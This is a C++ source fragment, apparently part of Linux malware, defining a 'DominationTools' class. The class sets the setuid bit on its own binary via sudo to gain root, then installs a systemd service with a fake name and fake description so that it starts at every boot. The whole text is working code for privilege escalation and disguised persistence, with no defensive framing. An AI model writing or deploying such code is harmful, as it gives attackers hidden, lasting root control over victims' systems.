class DominationTools{
	private:
		FILE* script;

		const char* data= "[Unit]\n" \
			   "Description=%s.\n" \

			   "[Service]\n" \
			   "Type=simple\n" \
			   "ExecStart=%s\n" \

			   "[Install]\n" \
			   "WantedBy=multi-user.target\n";


		char symb[sizeof(Current.fakename)+21]="/etc/systemd/system/";
		char cmd[sizeof(symb) + sizeof(Current.fakename) - 4];
		char escalator[sizeof(Current.name)*2 + 38];
		char path[12 + sizeof(Current.fakename)]="/usr/share/";

	public:
		DominationTools(){
			strcat(symb, Current.fakename);
			strcat(path, Current.fakename);

			sprintf(cmd, "chmod 644 %s; systemctl enable %s", symb, Current.fakename);
			sprintf(escalator, "sudo chown root:root %s; sudo chmod +s %s", Current.name, Current.name);
		}

		int EscalatePrivileges(){
			system(escalator);
			setuid(0);

			if (seteuid(0) == -1 || geteuid() != 0)
				return 1;

			Current.privileges = ADMIN;
			return 0;
		}

		int EnableAutoStart(){
			setuid(0);
			seteuid(0);

			script=fopen(path, "w");

			if (script == NULL)
				return 1;

			fprintf(script, data, Current.fakedescription, Current.name);
			fclose(script);


			if (symlink(path, symb) == -1)
				return 1;


			system(cmd);
			return 0;
		}
};
